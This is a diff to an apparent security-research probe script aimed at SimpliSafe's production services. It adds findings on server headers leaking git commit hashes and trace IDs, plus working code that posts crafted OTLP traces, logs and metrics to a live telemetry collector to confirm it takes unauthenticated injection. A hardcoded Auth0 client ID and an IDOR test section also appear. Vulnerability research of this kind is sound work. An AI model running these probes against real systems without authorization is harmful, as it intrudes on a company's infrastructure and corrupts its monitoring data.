@@ -49,6 +49,8 @@ SERVICES = {
     "devices":              "https://devices.simplisafe.com",
     "socketlink":           "https://socketlink.prd.aser.simplisafe.com",
     "address_validation":   "https://address-validation.prd.platform.simplisafe.com",
+    "sscr":                 "https://sscr.prd.platform.simplisafe.com",
+    "otel_collector":       "https://otel-collector-bridge.services.simplisafe.com",
 }
 
 AUTH0_CLIENT_ID = "DojdcaKF6ZzC80TpIBcx4que1JD7suFp"
@@ -133,12 +135,22 @@ FINDINGS = [
             verified=True,
             evidence='200 Prometheus text; pod="mediator-5669b6bff6-x6bqp", namespace="mediator", '
                      '7 active TCP sockets (live camera streams), 221MB resident. No auth.'),
-    Finding("F22", "LOW",     "Git Commit Hash in Server Header",
+    Finding("F22", "LOW",     "Git Commit Hash in Server Header — Systemic (3 services)",
             "location_auth", "/locations/x", "GET", None,
             verified=True,
-            evidence='server: location-grant-authorizations/0.1.0+b026ae7; '
-                     'address-validation: ss-address-validation/0.1.0+d023296; '
-                     'traceresponse header leaks internal trace IDs to external clients'),
+            evidence='location-grant-authorizations/0.1.0+b026ae7; '
+                     'ss-address-validation/0.1.0+d023296; '
+                     'ss-change-requests/0.1.0+bd49a7c (sscr.prd.platform). '
+                     'All 3 also leak traceresponse header to external clients on every response. '
+                     'Systemic: shared framework template misconfiguration.'),
+    Finding("F23", "MEDIUM",  "Unauthenticated OTel Full-Signal Injection (traces/logs/metrics)",
+            "otel_collector", "/v1/traces|/v1/logs|/v1/metrics", "POST", None,
+            verified=True,
+            evidence='POST /v1/traces -> 200 {"partialSuccess":{}}; '
+                     'POST /v1/logs -> 200 {"partialSuccess":{}}; '
+                     'POST /v1/metrics -> 200 {"partialSuccess":{}}. '
+                     'All three OTLP endpoints accept unauthenticated injection. '
+                     'No auth extension configured on OTel Collector OTLP receiver.'),
 ]
 
 
@@ -187,6 +199,33 @@ def _print(tag, status, msg):
 
 
 # ─── Unauthenticated Surface ────────────────────────────────────────────────────
+
+def probe_otel_injection():
+    """F23: Verify unauthenticated OTLP injection across all three signal types."""
+    base = SERVICES["otel_collector"]
+    ts = "1725897600000000000"
+    payloads = {
+        "/v1/traces": {"resourceSpans": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
+            "scopeSpans": [{"scope": {"name": "ss-re"}, "spans": [{"traceId": "aaaabbbbccccdddd0000111122223333",
+            "spanId": "aabbccdd11223344", "name": "unauth-probe", "startTimeUnixNano": ts,
+            "endTimeUnixNano": ts, "kind": 1}]}]}]},
+        "/v1/logs": {"resourceLogs": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
+            "scopeLogs": [{"scope": {"name": "ss-re"}, "logRecords": [{"timeUnixNano": ts,
+            "severityText": "INFO", "body": {"stringValue": "unauth-log-injection-probe"}}]}]}]},
+        "/v1/metrics": {"resourceMetrics": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
+            "scopeMetrics": [{"scope": {"name": "ss-re"}, "metrics": [{"name": "probe.counter",
+            "sum": {"dataPoints": [{"startTimeUnixNano": ts, "timeUnixNano": ts, "asInt": "1"}],
+            "aggregationTemporality": 2}}]}]}]},
+    }
+    print("\n=== F23 — OTel Unauthenticated Injection ===")
+    for path, body in payloads.items():
+        r = post(base + path, body=body)
+        if r and r.status_code == 200:
+            _print("HIGH", r.status_code, f"otel_collector{path} -> {r.text[:60]}  INJECTION ACCEPTED")
+        else:
+            status = r.status_code if r else "ERR"
+            _print("INFO", status, f"otel_collector{path}")
+
 
 def probe_unauth():
     print("\n=== Unauthenticated Surface ===")
@@ -253,20 +292,26 @@ def probe_unauth():
         lines = [l for l in r.text.split('\n') if 'pod=' in l]
         _print("HIGH", 200, f"mediator/metrics -> pod={lines[0][:80] if lines else 'unknown'}")
 
-    # F22: Server header git commit disclosure
+    # F22: Server header git commit disclosure (systemic — 3 services)
     import urllib.request, ssl as _ssl
     ctx = _ssl.create_default_context()
     for svc_url in [
         "https://location-grant-authorizations.prd.services.simplisafe.com/locations/x",
         "https://address-validation.prd.platform.simplisafe.com/v1/addresses",
+        "https://sscr.prd.platform.simplisafe.com/health",
     ]:
         try:
             rq = urllib.request.Request(svc_url, headers={"User-Agent": "SimpliSafe/8.3.0"})
             urllib.request.urlopen(rq, context=ctx, timeout=5)
         except urllib.error.HTTPError as e:
             srv = e.headers.get("server", "")
+            trace = e.headers.get("traceresponse", "")
+            host = svc_url.split("//")[1].split("/")[0]
             if srv:
-                _print("INFO", e.code, f"{svc_url.split('//')[1].split('/')[0]} server: {srv}")
+                _print("INFO", e.code, f"{host}  server: {srv}  traceresponse: {trace[:40]}")
+
+    # F23: OTel full-signal injection
+    probe_otel_injection()
 
 
 # ─── IDOR Test Suite ────────────────────────────────────────────────────────────
